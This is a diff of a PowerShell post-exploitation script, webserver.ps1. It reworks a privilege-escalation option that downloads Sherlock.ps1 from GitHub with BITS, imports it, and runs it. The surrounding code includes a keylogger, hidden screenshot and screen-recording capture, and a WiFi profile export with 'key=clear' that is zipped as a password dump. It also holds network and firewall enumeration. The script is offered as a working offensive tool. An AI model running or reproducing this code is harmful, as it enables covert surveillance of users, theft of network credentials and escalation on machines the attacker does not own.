@@ -182,53 +182,10 @@ $Banner = @"
 Clear-Host;
 Write-Host $Banner;
 
-If($EOP -ne "False"){
-If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $Keylogger -ne 'False'){
-   write-host "[warning] -EOP parameter can not be used together with other parameters .." -ForeGroundColor Yellow
-   Start-Sleep -Seconds 1
-}
-
-   <#
-   .SYNOPSIS
-      Author: @rasta.mouse
-      Find missing software patchs for privilege escalation
-
-   .NOTES
-      This Module does not exploit any vulnerabitys found.
-      It will 'report' them and presents the exploit-db link
-
-   .EXAMPLE
-      PS C:\> .\webserver.ps1 -EOP True
-      Find missing software patchs for privilege escalation
-   #>
-
-   ## Download Sherlock from @rasta-mouse github repository
-   Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 -Destination $Env:TMP\Sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null   
-
-   ## Check for file download integrity (fail/corrupted downloads)
-   $SizeDump = ((Get-Item -Path "$Env:TMP\Sherlock.ps1" -EA SilentlyContinue).length/1KB)
-   If(-not(Test-Path -Path "$Env:TMP\Sherlock.ps1") -or $SizeDump -lt 16){
-      ## Fail to download Sherlock.ps1 using curl.exe OR download file corrupted
-      Write-Host "[abort] fail to download Sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
-      Start-Sleep -Seconds 1
-      exit ## exit @webserver
-   }
-
-   ## Import-Module
-   If(Test-Path -Path "$Env:TMP\Sherlock.ps1"){
-      Write-Host "Find missing software patchs for privilege escalation" -ForeGroundColor DarkGreen
-      Import-Module $Env:TMP\Sherlock.ps1
-      Find-AllVulns
-   }
-   
-   Remove-Item -Path "$Env:TMP\Sherlock.ps1" -Force
-   Write-Host "";exit ## exit @webserver
-}
-
 If($Download -ne "False"){
 $ServerIP = $Download.split(',')[0] ## Extract server ip addr from -Download "string"
 $FileName = $Download.split(',')[1] ## Extract the filename from -Download "string"
-If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False'){
+If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $EOP -ne 'False'){
    write-host "[warning] -Download parameter can not be used together with other parameters .." -ForeGroundColor Yellow
    Start-Sleep -Seconds 1
 }
@@ -306,9 +263,10 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
    exit ## exit @webserver
 }
 
+
 If($SKill -gt 0){
 $Count = 0 ## Loop counter 
-If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False'){
+If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $EOP -ne 'False'){
    write-host "[warning] -SKill parameter can not be used together with other parameters .." -ForeGroundColor Yellow
    Start-Sleep -Seconds 1
 }
@@ -348,6 +306,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
    write-host "";Start-Sleep -Seconds 1
    exit ## exit @webserver
 }
+
 
 If($Sessions -ieq "List" -or $Sessions -Match '^\d+$'){
 $Count = 0 ## Loop counter
@@ -399,7 +358,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
          ## Delete session PID Number from sessions.log file
          # $GrabPidIdentifier = Get-Content "$Env:TMP\sessions.log"|findstr /C:"$Sessions"
          # $SessionPidDeletion = $GrabPidIdentifier[0,1,2,3] -Join ''
-         ((Get-Content -Path "$Env:TMP\sessions.log" -Raw|Select-String "$Sessions") -Replace "$Sessions","****")|Set-Content -Path "$Env:TMP\sessions.log" -NoNewLine -Force
+         ((Get-Content -Path "$Env:TMP\sessions.log" -Raw|Select-String "$Sessions") -Replace "$Sessions","STOP")|Set-Content -Path "$Env:TMP\sessions.log" -NoNewLine -Force
       }Else{
          Write-Host "[fail] PID: $Sessions Not found" -ForeGroundColor Red -BackgroundColor Black
       }
@@ -407,6 +366,51 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
    write-host "";Start-Sleep -Seconds 1
    exit ## exit @webserver
 }
+
+
+If($EOP -ne "False"){
+If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'False' -or $Keylogger -ne 'False'){
+   write-host "[warning] -EOP parameter can not be used together with other parameters .." -ForeGroundColor Yellow
+   Start-Sleep -Seconds 1
+}
+
+   <#
+   .SYNOPSIS
+      Author: @rasta-mouse (sherlock.ps1)
+      Find missing software patchs for privilege escalation
+
+   .NOTES
+      This Module does not exploit any vulnerabitys found.
+      It will 'report' them and presents the exploit-db link
+
+   .EXAMPLE
+      PS C:\> .\webserver.ps1 -EOP True
+      Find missing software patchs for privilege escalation
+   #>
+
+   ## Download Sherlock (@rasta-mouse) from my github repository
+   Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/sherlock.ps1 -Destination $Env:TMP\sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null   
+
+   ## Check for file download integrity (fail/corrupted downloads)
+   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB)
+   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 16){
+      ## Fail to download Sherlock.ps1 using BitsTransfer OR download file is corrupted
+      Write-Host "[abort] fail to download sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
+      If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
+      Start-Sleep -Seconds 1;exit ## exit @webserver
+   }
+
+   ## Import-Module
+   $SherlockPath = Test-Path -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
+   If($SherlockPath -ieq "True" -and $SizeDump -gt 15){
+      Write-Host "Find missing software patchs for privilege escalation" -ForeGroundColor DarkGreen
+      Import-Module $Env:TMP\sherlock.ps1
+      Find-AllVulns
+   }
+   If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
+   Write-Host "";exit ## exit @webserver
+}
+
 
 If($SRec -gt 0){
 $Limmit = $SRec+1 ## The number of screenshots to be taken
@@ -452,6 +456,7 @@ If($SRDelay -lt '1'){$SRDelay = '1'} ## Screenshots delay time minimum value acc
    Write-Host ""
 }
 
+
 If($SPsr -gt 0){
 ## Random FileName generation
 $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
@@ -487,6 +492,7 @@ If($SPsr -lt '8'){$SPsr = '10'} # Set the minimum capture time value
       Start-Sleep -Seconds 1
    }
 }
+
 
 If($Keylogger -ieq 'Start' -or $Keylogger -ieq 'Stop'){
 $Timer = Get-Date -Format 'HH:mm:ss'
@@ -557,7 +563,6 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       }
    }
 
-
    If($Keylogger -ieq 'Stop'){
       ## Dump captured keystrokes
       # Stops process and Delete files/logs
@@ -585,6 +590,7 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       Start-Sleep -Milliseconds 600;exit ## exit @webserver
    }
 }
+
 
 $PythonVersion = cmd /c python --version
 If(-not($PythonVersion) -or $PythonVersion -ieq $null){
@@ -632,6 +638,7 @@ If(-not($PythonVersion) -or $PythonVersion -ieq $null){
       Write-Host "[Auto] Activate : -SForce 2 parameter to use powershell Start-BitsTransfer" -ForeGroundColor Yellow;Start-Sleep -Seconds 2
    }
 }
+
 
 If($SForce -gt 0){
 $i = 0 ## Loop counter
@@ -769,6 +776,7 @@ If(-not($Installation) -or $Installation -ieq $null){
       write-host "";Start-Sleep -Seconds 1
    }
 
+
    ## WebBrowser Enumeration (-SEnum True|Verbose)
    If($SEnum -ieq "True" -or $SEnum -ieq "Verbose"){
 
@@ -830,14 +838,17 @@ If(-not($Installation) -or $Installation -ieq $null){
          write-host "WebServerTitle   : $WebTitle`n"
 
       If($SEnum -ieq "Verbose"){
-         Write-Host ""
          ## Display @webserver firewall rule
          Get-NetFirewallRule|Where { $_.DisplayName -eq 'python.exe' }|Select-Object DisplayName,Description,Enabled,Profile,Direction,Action|Format-Table -AutoSize > $Env:TMP\PSfirewall.log
          Get-Content -Path "$Env:TMP\PSfirewall.log";Remove-Item -Path "$Env:TMP\PSfirewall.log" -Force
       }
 
       ## TCP Connections enumeration
-      echo "`nConnection Status" > $Env:TMP\logfile.log
+      If($SEnum -ieq "Verbose"){
+         echo "Connection Status" > $Env:TMP\logfile.log
+      }Else{
+         echo "`nConnection Status" > $Env:TMP\logfile.log
+      }
       echo "-----------------" >> $Env:TMP\logfile.log
       echo "  Proto  Local Address          Foreign Address        State           PID" >> $Env:TMP\logfile.log
       cmd /c netstat -ano|findstr "${Remote_Host}:${Remote_Server_Port}"|findstr "LISTENING ESTABLISHED" >> $Env:TMP\logfile.log
@@ -880,14 +891,17 @@ If(-not($Installation) -or $Installation -ieq $null){
          If(-not(Test-Path "$Env:TMP\$DumpFolder")){New-Item "$Env:TMP\$DumpFolder" -ItemType Directory -Force|Out-Null}
          netsh wlan export profile folder=$Env:TMP\$DumpFolder key=clear|Out-Null
          Compress-Archive -Path "$Env:TMP\$DumpFolder" -DestinationPath "$Env:TMP\SSIDump.zip" -Force
-         Write-Host "`n`n  Wifi SSID Dump stored under: $Env:TMP\SSIDump.zip" -ForeGroundColor Yellow
-         Start-Sleep -Seconds 1;Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null
+
+         ## Build Table Output
+         Write-Host "WiFi SID password dump"
+         Write-Host "----------------------"
+         Write-Host "$Env:TMP\SSIDump.zip";Start-Sleep -Seconds 1
+         Remove-Item "$Env:TMP\$DumpFolder" -Recurse -Force|Out-Null
 
       }
    }
 }
 
-Write-Host ""
 ## Final Notes:
 # The 'cmd /c' syscall its used in certain ocasions in this cmdlet only because
 # it produces less error outputs in terminal prompt compared with PowerShell.
